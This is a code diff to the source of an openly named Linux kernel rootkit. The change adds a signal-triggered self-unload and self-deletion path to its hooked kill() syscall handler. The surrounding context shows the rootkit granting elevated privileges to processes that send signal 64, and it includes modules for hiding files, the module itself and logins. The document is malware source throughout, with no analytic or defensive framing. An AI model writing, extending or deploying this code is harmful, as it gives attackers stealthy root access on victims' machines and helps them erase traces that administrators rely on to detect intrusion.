@@ -15,6 +15,7 @@
 #include "hooking/func.h"
 #include "capabilities/privilege.h"
 #include "capabilities/tracking.h"
+#include "capabilities/unloading.h"
 #include "capabilities/hiding/dentry.h"
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
@@ -29,7 +30,8 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
+    ROOTI_SIG_UNLOAD = 63,  // make the rootkit self destruct by unloading itself
+    ROOTI_SIG_REG = 64      // request by a usermode process to be serviced by the rootkit
 };
 
 // Bitmap in which every bit represents the PID number of a registered client userspace process
@@ -73,6 +75,10 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
         // Register the new process
         rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
         return rooti_elevate_privilege();
+    } 
+    else if (sig == ROOTI_SIG_UNLOAD) {
+        // Schedule the unloading of the rootkit
+        return rooti_schedule_self_deletion();
     }
     return orig_kill(regs);
 }
